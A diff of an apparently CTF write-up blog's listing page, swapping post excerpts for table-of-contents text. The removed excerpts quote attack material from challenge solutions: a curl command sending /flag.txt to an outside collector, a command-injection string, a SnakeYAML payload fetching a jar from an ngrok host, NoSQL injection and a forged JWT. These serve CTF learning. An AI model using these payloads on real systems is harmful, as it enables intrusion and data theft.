@@ -69,6 +69,12 @@
         
           
             <li>
+              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
               <a title="Posts" href="https://l3mnt2010.github.io/posts">Posts</a>
             </li>
           
@@ -76,18 +82,6 @@
           
             <li>
               <a title="Write-up" href="https://l3mnt2010.github.io/write-up">Write-up</a>
-            </li>
-          
-        
-          
-            <li>
-              <a title="Tags" href="https://l3mnt2010.github.io/tags">Tags</a>
-            </li>
-          
-        
-          
-            <li>
-              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
             </li>
           
         
@@ -240,9 +234,7 @@
     </p>
     <div class="post-entry">
         
-        WEB challs Login!   Bài này là một bài white box nên mình sẽ vào xem source code của nó luôn nha.
-  Bài cho file này thui:
-  const express = require('express');const crypto = require('crypto');const FLAG = process.env.FLAG || 'flag{this_is_a_fake_flag}';const app = express();app.use(express.urlencoded({ extended: true }));const USER_DB = {user: {username: 'user', password: crypto.randomBytes(32).toString('hex')},guest: {username: 'guest',password: 'guest'}};app.
+        WEB challs  Login! Buggy Bounty    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.6rem; text-align: left; }.toc ul, .toc ol {padding-left: 0; margin: 0;list-style-type: none;text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2024-03-30-acscctf2024/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -289,9 +281,7 @@
     </p>
     <div class="post-entry">
         
-        Hacker Community Flag: AKASEC{__W3lc0me_t0_HackerC0mmun1tyy__}
-Rusty Road poc:
-# import requests## register_url = &quot;http://172.206.89.197:9080/register&quot;# login_url = &quot;http://172.206.89.197:9080/login&quot;# alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!@#$%^&amp;*()_+-=,./&lt;&gt;?:&quot;# username = &quot;lamdepchaiii&quot;# PASSWORD = &quot;M07H4F7H38167Hr33175JU57816M3&quot;# index = 71# loop = 1## while True:# data_reg = {# &quot;username&quot;: username + &quot;a&quot; * loop,# &quot;password&quot;: &quot;a&quot; * index + &quot;PASSWORD&quot;# }## register_response = requests.post(register_url, data=data_reg)# if &quot;Hello&quot; in register_response.
+        Hacker Community Rusty Road Upload Hacker NickName  Phân tích lỗ hổng CVE-2021-25646 Jackson: Phân tích CVE-2017-17485 java deserialize to RCE     Set JWT admin true cookie Ref: https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/  Proxy for life Misc/Pyjail    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2024-06-13-akasecctf2024-web-chall/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -338,7 +328,7 @@ Rusty Road poc:
     </p>
     <div class="post-entry">
         
-        Bastard (env) l3mnt2010@ASUSEXPERTBOOK:~/new/htb/Bastard$ ruby 44449.rb http://bastard.htb[*] --==[::#Drupalggedon2::]==----------------------------------------------------------------------------------[i] Target : http://bastard.htb/--------------------------------------------------------------------------------[+] Found : http://bastard.htb/CHANGELOG.txt (HTTP Response: 200)[+] Drupal!: v7.54--------------------------------------------------------------------------------[*] Testing: Form (user/password)[+] Result : Form valid- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -[*] Testing: Clean URLs[+] Result : Clean URLs enabled--------------------------------------------------------------------------------[*] Testing: Code Execution (Method: name)[i] Payload: echo CQGHNWUY[+] Result : CQGHNWUY[+] Good News Everyone!
+        Bastard  cheat    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.6rem; text-align: left; }.toc ul, .toc ol {padding-left: 0; margin: 0;list-style-type: none;text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2025-01-03-bastard/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -385,10 +375,7 @@ Rusty Road poc:
     </p>
     <div class="post-entry">
         
-        WEB challs Image gallery 1 Đây là một bài white box với chức năng upload file tạo note và xem note cùng với share cho admin
-Bắt đầu đi vào với file app.js
-Có thể thấy source là :
-const express = require('express');const cookieParser = require('cookie-parser');const fs = require('fs');const ejs = require('ejs');const path = require(&quot;path&quot;); const fileUpload = require('express-fileupload');const {randomUUID } = require(&quot;crypto&quot;);const { visit } = require('.
+        WEB challs  Image gallery 1  Route / : route /upload Route /share Triển khai   Require Notes  Route /create Route / Route /delete Route /search/:noteId route /customise Route /healthcheck Phân tích các lỗ hổng trong lib  1. SSTI TO RCE EJS 3.1.9 2. CVE protobuf - Prototype Pollution   FLOW Triển khai      .
         <a href="https://l3mnt2010.github.io/write-up/2024-01-28-bi0sctf2024/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -435,7 +422,7 @@ const express = require('express');const cookieParser = require('cookie-parser'
     </p>
     <div class="post-entry">
         
-        WEB challs Metadata checker  This is whitebox challenge, you can view source below:  if (isset($_FILES) &amp;&amp; !empty($_FILES)) {$uploadpath = &quot;/var/tmp/&quot;;$error = &quot;&quot;;$timestamp = time();$userValue = $_COOKIE['user'];$target_file = $uploadpath . $userValue . &quot;_&quot; . $timestamp . &quot;_&quot; . $_FILES[&quot;image&quot;][&quot;name&quot;];move_uploaded_file($_FILES[&quot;image&quot;][&quot;tmp_name&quot;], $target_file);if ($_FILES[&quot;image&quot;][&quot;size&quot;] &gt; 1048576) {$error .= '&lt;p class=&quot;h5 text-danger&quot;&gt;Maximum file size is 1MB.&lt;/p&gt;';} elseif ($_FILES[&quot;image&quot;][&quot;type&quot;] !== &quot;image/jpeg&quot;) {$error .= '&lt;p class=&quot;h5 text-danger&quot;&gt;Only JPG files are allowed.
+        WEB challs  Metadata checker  Flow: Handle: Deployment:   Image Copy resample      .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.
         <a href="https://l3mnt2010.github.io/write-up/2023-08-19-bksecctf2023/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -482,13 +469,7 @@ const express = require('express');const cookieParser = require('cookie-parser'
     </p>
     <div class="post-entry">
         
-        write up some chall (i solved all web &rsquo;s challenges in this platform) Baby Ping Empty Execution  Tạo reversere shell để tiến hành đọc flag  Baby Crawler bypass escapeshellcmd: https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md
-Ethical Ping Pong Club Blind Command Injection Time Break The Editor Jail https://zacheller.dev/text-editor-jail
-https://b4d.sablun.org/blog/2020-02-16-247ctf-com-misc-the-text-editor-jail/
-Ping 0x01 Ping 0x02 https://forum.cookiearena.org/t/web-ping-0x01-ping-0x02-os-command-injection/164
-Youtube Downloader chỉ cần ;cat%20/flag.txt là được.
-The Existed File $(curl${IFS}-X${IFS}POST${IFS}--data${IFS}@/flag.txt${IFS}http://fvcwu3xj.requestrepo.com)
-Are you a search engine bot  Bài này mình sẽ sử dụng google bot để crawling tất cả những path ẩn https://www.
+        Write up some chall (i solved all web &rsquo;s challenges in this platform)  Baby Ping Empty Execution Baby Crawler Ethical Ping Pong Club Blind Command Injection Time Break The Editor Jail Ping 0x01 Ping 0x02 Youtube Downloader The Existed File Are you a search engine bot Baby HTTP Method Bypass HMAC check Neonify Favorite JWT Baby Slippy BaBy Assert Baby Address Note      .
         <a href="https://l3mnt2010.github.io/write-up/2023-01-14-cookiearena/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -535,7 +516,7 @@ Are you a search engine bot  Bài này mình sẽ sử dụng google bot để c
     </p>
     <div class="post-entry">
         
-        WEB challs rock-paper-scissors [79 solves]  Một chall kéo - búa - bao với nodejs + redis để lưu số lần thắng của người chơi.  analysis  Ta sẽ đi vào phần tích các api của server:  import Redis from 'ioredis';import fastify from 'fastify';import fastifyStatic from '@fastify/static';import fastifyJwt from '@fastify/jwt';import fastifyCookie from '@fastify/cookie';import { join } from 'node:path';import { randomBytes, randomInt } from 'node:crypto';const redis = new Redis(6379, &quot;redis&quot;);const app = fastify();const winning = new Map([['🪨', '📃'],['📃', '✂️'],['✂️', '🪨']]);app.
+        WEB challs  rock-paper-scissors [79 solves]  analysis exploit real server Notes   erm [60 solves]  analysis exploit   msfrogofwar3  analyst solution1 solution 2   corctf-challenge-dev  analysis extension   iframe-note  analyst  api / api /login + /register -&gt; đăng kí &amp; đăng nhập api /create api /view -&gt; hiển thị view template api /iframe/&lt;id&gt;   detect      .
         <a href="https://l3mnt2010.github.io/write-up/2024-07-27-corctf2024/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -582,10 +563,7 @@ Are you a search engine bot  Bài này mình sẽ sử dụng google bot để c
     </p>
     <div class="post-entry">
         
-        WEB challs web/0ld_b4t_g0ld Bài này là một bài black box tương đối đơn giản có chức năng reg + login -&gt; sau khi login thì ta được chuyển đến một giao diện comment
-Sau khi comment thì sẽ hiển thị comment ở dưới:
-Quan sát api đã được gửi
-Vì thông tin đã bị escape nên khả năng là không xss được nên mình ngay lập tức nghĩ đến SSTI nhưng có vẻ không được để ý là api này version2 nên mình đổi thành version1 và may mắn nó vẫn có hoạt động
+        WEB challs  web/0ld_b4t_g0ld web/Funny buttons [9 solves]  analysis Socket-IO server: CVE-2022-46164 Account takeover via prototype vulnerability in NodeBB exploit local + real server   web/breathtaking-roulette    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.
         <a href="https://l3mnt2010.github.io/write-up/2024-08-10-ctfzone2024/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -632,9 +610,7 @@ Vì thông tin đã bị escape nên khả năng là không xss được nên m�
     </p>
     <div class="post-entry">
         
-        Cyber Apocalypse 2024: Hacker Royale with KCSC Flag Command     Đây là một bài client khá là dễ:
-    Để ý phần hàm
-  const fetchOptions = () =&gt; {fetch('/api/options').then((data) =&gt; data.json()).then((res) =&gt; {availableOptions = res.allPossibleCommands;}).catch(() =&gt; {availableOptions = undefined;})} Hàm gọi method get tới endpoint /api/options và trả về json, hãy xem thử  Như ta thấy thì có secret = Blip-blop, in a pickle with a hiccup!
+        Cyber Apocalypse 2024: Hacker Royale with KCSC  Flag Command Testimonial  RCE Exploit   Time KORP Labyrinth_linguist  DETECT  /src/main/resources/templates/index.html Dockerfile   Apache Velocity Server-Side Template Injection   SerialFlow - medium Korp terminal    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2024-03-09-cyberapocalypse2024/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -681,10 +657,7 @@ Vì thông tin đã bị escape nên khả năng là không xss được nên m�
     </p>
     <div class="post-entry">
         
-        Devel ở đây có 2 cổng đang mở là 21 là ftp và 80 là http webserver đang chạy web với phần mở rộng tệp là .aspx
-tìm được bài khai thác với metasploit:
-https://www.rapid7.com/blog/post/2009/12/28/exploiting-microsoft-iis-with-metasploit/
-l3mnt2010@ASUSEXPERTBOOK:~$ ftp 10.129.243.118Connected to 10.129.243.118.220 Microsoft FTP ServiceName (10.129.243.118:l3mnt2010): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password:230 User logged in.Remote system type is Windows_NT.ftp&gt; ls229 Entering Extended Passive Mode (|||49158|)125 Data connection already open; Transfer starting.
+        Devel  cheat    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.6rem; text-align: left; }.toc ul, .toc ol {padding-left: 0; margin: 0;list-style-type: none;text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2024-12-02-develhtb/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -734,8 +707,7 @@ l3mnt2010@ASUSEXPERTBOOK:~$ ftp 10.129.243.118Connected to 10.129.243.118.220 
     </p>
     <div class="post-entry">
         
-        vsCTF 2024 ONLYECHO source :
-const readline = require('node:readline');const parse = require('bash-parser');const { exec } = require(&quot;child_process&quot;);const check = ast =&gt; {if (typeof(ast) === 'string') {return true;}for (var prop in ast) {if (prop === 'type' &amp;&amp; ast[prop] === 'Redirect') {return false;}if (prop === 'type' &amp;&amp; ast[prop] === 'Command') {if (ast['name'] &amp;&amp; ast['name']['text'] &amp;&amp; ast['name']['text'] != 'echo') {return false;}}if (!
+        vsCTF 2024  ONLYECHO    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.6rem; text-align: left; }.toc ul, .toc ol {padding-left: 0; margin: 0;list-style-type: none;text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2024-06-23-googlectf2024/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -782,7 +754,7 @@ const readline = require('node:readline');const parse = require('bash-parser');
     </p>
     <div class="post-entry">
         
-        Hackthebox some easy machine POST /login HTTP/1.1Host: dev.stocker.htbUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brContent-Type: application/jsonContent-Length: 55Origin: http://dev.stocker.htbConnection: closeReferer: http://dev.stocker.htb/loginCookie: connect.sid=s%3AVKqxf1CbQcRK0LQcs4q8uXjL8AMGIYSf.hnzIXLK5fbo0Q7ZOe28EjtHvb%2BcXTeTsIpOeYTwHwsEUpgrade-Insecure-Requests: 1Priority: u=0, i{&quot;username&quot;: {&quot;$ne&quot;: null}, &quot;password&quot;: {&quot;$ne&quot;: null} }Chức năng cơ bản là ta có thể thêm đồ vào giỏ hàng sau đó sẽ order và click vào here ta sẽ thấy có một mẫu kiểu pdf để hiển thị thông tin các sản phẩm và giá -&gt; nghĩ đến lỗi ssrf của file pdf
+        Hackthebox some easy machine  Soccer  80/http   Precious Editorial    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.6rem; text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2024-05-14-htb-machine/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -829,7 +801,7 @@ const readline = require('node:readline');const parse = require('bash-parser');
     </p>
     <div class="post-entry">
         
-        Solved challenges Web/Jailbreak  Mở đầu các chall web bằng một bài black box khá đơn giản. Trang web có khá nhiều page render client side và không tương tác với server trừ chức năng update firmware với định dạng file xml.   Nhìn vào thì ta sẽ nghĩ ngay đến vul XXE external entity injection để đọc file trên hệ thống. Quan sát kĩ hơn bằng việc chặn proxy :    Post method với /api/update nhận file xml và trả ra nội dung update version nằm trong một thẻ của file xml vì vậy có thể đoán nôm na rằng server sẽ hiển thị nội dung của tag Version.
+        Solved challenges  Web/Jailbreak Web/Blueprint Heist  Reconnaissance + detect  publicRoutes internalRoutes RCE   Exploit wkhtmltopdf SSRF Leak secret_key jwt -&gt; authenticate to admin user. Exploit Sqli bypass waf SSTI in ejs template via sqli Exploit chain     Giải này phần MISC có khá nhiều bài web với mức độ tầm medium + easy  MISC/Chrono Mind FullPwn/Submerged  User Flag Root flag   Misc/Zephyr  Nhánh main Nhánh w4rri0r-changes Flag3 - Stash   Web/Magicom misc/Super-Duper Pwn  bot api     Team write up: Tại đây  .
         <a href="https://l3mnt2010.github.io/write-up/2024-05-18-htbbusinessctf2024/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -876,9 +848,7 @@ const readline = require('node:readline');const parse = require('bash-parser');
     </p>
     <div class="post-entry">
         
-        Hack the box Trapped Source  Đây là bài chỉ view source thôi   Như ta thấy nếu mà pin đúng sẽ gọi fetch với method post đến /flag và nhận flag.   Correct pin là : 9661 nhận flag nào:  Flag : HTB{vi3w_cli13nt_s0urc3_S3cr3ts!}
-Spookifier   Đây là một bài white box.
-  Chức năng đơn giản là thay đổi phông chữ tạo ra nhiều lại với đầu vào mà chúng ta cho vào.
+        Hack the box  Trapped Source Spookifier Flag Command KORP Terminal SpookTastic Juggling facts CandyVault Jailbreak Cursed Secret Party  Flow   Gunship   easy  jscalc Insomnia  Access control vulnerability   0xBOverchunked Blueprint Heist Labyrinth Linguist GateCrash  Go server Nim proxy Flow Khai thác   Saturn HTBank  php_backend flask_frontend   GhostlyTemplates  Exploit   Spellbound Servants  Flow Exploit   PumpkinSpice  Flow Exploit      .
         <a href="https://l3mnt2010.github.io/write-up/2024-08-20-hackthebox-web-challpart1/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -925,7 +895,7 @@ Spookifier   Đây là một bài white box.
     </p>
     <div class="post-entry">
         
-        Hack the box HauntMart  Tiếp tục chall với cấu trúc y hệt như mấy chall python_flask trước:  from flask import Flaskfrom application.blueprints.routes import web, apifrom application.database import mysqlfrom application.util import responseapp = Flask(__name__)app.config.from_object('application.config.Config')mysql.init_app(app)app.register_blueprint(web, url_prefix='/')app.register_blueprint(api, url_prefix='/api')@app.errorhandler(404)def not_found(error):return response('404 Not Found'), 404@app.errorhandler(403)def forbidden(error):return response('403 Forbidden'), 403@app.errorhandler(400)def bad_request(error):return response('400 Bad Request'), 400@app.errorhandler(Exception)def handle_error(error):message = error.
+        Hack the box  HauntMart  exploit   PDFy ProxyAsAService  Exploit   Testimonial  RCE Exploit   HTB Proxy  Go proxy Bypass ssrf via nip.io DNS binding   Wild Goose Hunt emoji voting  exploit   ApacheBlaze  Backend Exploit CVE-2023-25690 HTTP Request Smuggling Explain   RenderQuest    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2024-08-21-hackthebox-web-challpart2/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -972,9 +942,7 @@ Spookifier   Đây là một bài white box.
     </p>
     <div class="post-entry">
         
-        Hack the box Watersnake POST /update HTTP/1.1Host: 83.136.255.222:50084User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://83.136.255.222:50084/update.htmlContent-Type: multipart/form-data; boundary=---------------------------56413677111823040781259599420Content-Length: 322Origin: http://83.136.255.222:50084Connection: closePriority: u=0-----------------------------56413677111823040781259599420Content-Disposition: form-data; name=&quot;config&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://0.tcp.ap.ngrok.io:11632/yaml-payload.jar&quot;]]]]-----------------------------56413677111823040781259599420--flag: HTB{sn4k3_y4ml_d3s3r14lized_ftw!}
-link: https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/ poc: https://github.com/artsploit/yaml-payload/tree/master
-Lazy Ballot Couch [No sqli]  async loginUser(username, password) {const options = {selector: {username: username,password: password,},};const resp = await this.
+        Hack the box  Watersnake Lazy Ballot Couch [No sqli] Neonify Kryptos Support Intergalactic Post  analysis Exploit local server + real server   BlinkerFluids  analysis + detect Remote Code Execution (RCE) in md-to-pdf version 4.1.0 exploit   EasterBunny petpet rcbee baby CachedView looking glass sanitize baby auth baby nginxatsu baby WAFfles order baby todo or not todo baby BoneChewerCon Full Stack Conf    .
         <a href="https://l3mnt2010.github.io/write-up/2024-08-22-hackthebox-web-challpart3/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -1021,8 +989,7 @@ Lazy Ballot Couch [No sqli]  async loginUser(username, password) {const options
     </p>
     <div class="post-entry">
         
-        Hack the box (part4) - Medium Under Construction GET / HTTP/1.1Host: 94.237.49.212:43743User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://burpsuite/Connection: closeCookie: PHPSESSID=eyJ1c2VybmFtZSI6ImhpaGlAZ21haWwuY29tIn0%3D; session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICIndW5pb24gc2VsZWN0IG51bGwsdG9wX3NlY3JldF9mbGFhZyxudWxsIGZyb20gZmxhZ19zdG9yYWdlLS0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsICJpYXQiOiAxNzI2ODAxNTQ2fQ.GMnFlwfpkGpgap8Wj4pdWhj67MzSyYc4goQvVb6npBcUpgrade-Insecure-Requests: 1Priority: u=0, iflag: HTB{d0n7_3xp053_y0ur_publ1ck3y}
-breaking grad POST /api/calculate HTTP/1.1Host: 83.136.249.80:30878User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://83.
+        Hack the box (part4) - Medium  Under Construction breaking grad wafwaf baby ninja ninja Mutation Lab HTB Proxy  backend [nodejs] proxy [golang]   SerialFlow LockTalk Magicom interdimensional internet Console    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2024-08-23-hackthebox-web-challpart4/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -1069,10 +1036,8 @@ breaking grad POST /api/calculate HTTP/1.1Host: 83.136.249.80:30878User-Agent:
     </p>
     <div class="post-entry">
         
-        <!-- raw HTML omitted -->
-<h3 id="imaginaryctf2021">ImaginaryCTF2021</h3>
-<p><a href="https://hackmd.io/@l3mnt2010/Hyighl1IR">ImaginaryCTF2021 WRITE UP</a></p>
-
+        ImaginaryCTF2021      .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.6rem; text-align: left; }.toc ul, .toc ol {padding-left: 0; margin: 0;list-style-type: none;text-align: left; }.
+        <a href="https://l3mnt2010.github.io/write-up/2021-07-23-imaginaryctf2021/" class="post-read-more">[Read More]</a>
         
     </div>
 
@@ -1118,8 +1083,7 @@ breaking grad POST /api/calculate HTTP/1.1Host: 83.136.249.80:30878User-Agent:
     </p>
     <div class="post-entry">
         
-        WEB challs InsoBank   Title : NextJs, Python, MySql, postgresSql, smart from u :3
-  The web application in this challenge is a banking app that supports transferring deposits from one account to another. However, all the accounts involved in a transfer operation must belong to the same person; this means we cannot transfer money from our account to other people’s accounts.   You must register with new account and login with your account   You only can transfer for 2 account provide by sever
+        WEB challs  InsoBank  After a thorough code review, here are the vulnerabilities that we can exploit:      .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.
         <a href="https://l3mnt2010.github.io/write-up/2024-04-26-insomnihack2024/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -1166,11 +1130,7 @@ breaking grad POST /api/calculate HTTP/1.1Host: 83.136.249.80:30878User-Agent:
     </p>
     <div class="post-entry">
         
-        ISITDTU CTF 2024 my team RipeRice in the top 4
-web/Another one Source code: python flask + bug ujson + ssti template jinjja
-Trang web có chức năng đăng kí đăng nhập + hiển thị + render template nhưng không hiển thị kết quả
-Quan sát dockerfile ta thấy mạng để internal
-networks:internal:driver: bridgeServer đã xóa rm /usr/bin/wget và không có các câu lệnh có thể OOB, flag được random name nằm tại /app nên định hướng từ đầu có vẻ là rce.
+        ISITDTU CTF 2024  web/Another one web/ X ÉC ÉC web/S1mple  recon detect exploit      .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.
         <a href="https://l3mnt2010.github.io/write-up/2024-10-24-isitdtu-ctf-2024/" class="post-read-more">[Read More]</a>
         
     </div>
